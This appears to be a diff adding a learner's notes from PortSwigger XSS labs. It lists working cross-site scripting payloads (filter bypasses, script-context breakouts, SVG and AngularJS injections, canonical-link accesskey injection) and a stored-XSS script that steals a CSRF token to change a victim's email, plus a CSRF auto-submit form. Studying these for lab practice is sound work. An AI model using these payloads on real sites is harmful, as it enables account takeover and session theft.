@@ -1,0 +1,140 @@
+1. search func. or posting comments
+2. if theres JS that intakes whatever we search for thats good
+3. valid payload for escaping of angled brackets, backticks, etc. escaped:
+/?search=${alert(1)}
+
+
+
+Stored DOM XSS:
+<><img src=1 onerror=alert(1)>
+
+
+
+it is passing the input through a js file called loadCommentsWithVulnerableEscapeHtml.js
+however, nn an attempt to prevent XSS, the website uses the JavaScript replace() function to encode angle brackets. However, when the first argument is a string, the function only replaces the first occurrence. We exploit this vulnerability by simply including an extra set of angle brackets at the beginning of the comment. These angle brackets will be encoded, but any subsequent angle brackets will be unaffected, enabling us to effectively bypass the filter and inject HTML.
+
+
+
+
+CUSTOM HTML TAGS
+<script>
+location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+</script>
+
+This injection creates a custom tag with the ID x, which contains an onfocus event handler that triggers the alert function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the alert payload to be called.
+
+SCRIPT SNIPPET from a lab:
+
+                    <script>
+                        var searchTerms = '\\' ; alert(1) \\';
+                        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+                    </script>
+
+this comes down to injecting an engineered string into the script block
+sanitization escapes the ' so that we cant break out 
+escaping the escape: a backslash escapes the added backslash, then we can either + or = or ; 
+and comment out the rest of the script as such: // 
+
+also, if none work, try just closing the <script> tag and opening your own:
+</script><img src=x onerror=alert(1)>
+
+
+
+Stored XSS into onclick - injecting XSS into the Website variable inside the comment functionality
+
+payload:
+http://foo?&apos;-alert(1)-&apos;
+
+HTML snippet:
+<a id="author" href="http://foo?&apos;-alert(1)-&apos;" onclick="var tracker={track(){}};tracker.track('http://foo?&apos;-alert(1)-&apos;');">123</a> | 29 January 2024
+
+
+
+SOMETIMES / SVG markup payload
+
+some tags are blocked, look for the ones that aren't 
+<svg><animatetransform onbegin=alert(1) attributeName=transform>
+<svg><animatetransform onbegin=alert(document.domain) attributeName=transform>
+
+For when theres a long JS present, look for extra steps in which the data is passed
+try breaking out, anything is game, " ' <> // \\ -- 
+eg:
+\"-alert(1)}//
+
+
+
+
+
+ANGULARJS 
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md
+try different payloads, when theres limited functionalities, or other libraries like angularJS, try googling XSS Payloads for those, first one of the list worked:
+{{constructor.constructor('alert(1)')()}}
+
+
+
+XSS with CSRF 
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+
+
+
+
+
+
+CANONICAL LINK TAG
+happens when theres a tag at the top of the HTTP code 
+<link rel="canonical" href='https://0aeb007003ed8ec88034a86400d10008.web-security-academy.net/post?postId=3'/>
+
+identify the injection point - we can append stuff to the URL and it gets reflected
+final weaponized tag looks like this:
+<link rel="canonical" href='https://0aeb007003ed8ec88034a86400d10008.web-security-academy.net/post?postId=3&id=123'accesskey='x'onclick='alert(1)'/>
+
+
+
+
+
+
+HOW TO TEST THE SEARCH BAR
+if theres no JS or filtering or encoding - just the search bar 
+go to portswigger XSS cheatsheet 
+https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+
+copy the tags, throw the search request into repeater, place markers inbetween <>, like so
+GET /?search=<§§> 
+
+click paste in the payloads tab, all tags will paste from the site
+identify tag that isn't blocked
+
+
+
+
+XSS with CSRF:
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
+
+
+use this as a comment to a blog post
+
+NOTE 
+this payload also worked, but it did not solve the lab:
+
+    <div>
+        <form action="https://0a3d001d04da6d16805b7b4600fd0055.web-security-academy.net/my-account/change-email" method="POST">
+            <input type="hidden" name="email" value="ofiara123@evil-user.net" />
+<input type="hidden" name="csrf" value="vpAfXKpXcmr0LkEbCVCRpY9aKLp5Ejze" />
+        </form>
+        <script>
+	    history.pushState("", "", "/?0a3d001d04da6d16805b7b4600fd0055.web-security-academy.net")
+            document.forms[0].submit();
+        </script>
+    </div>
+
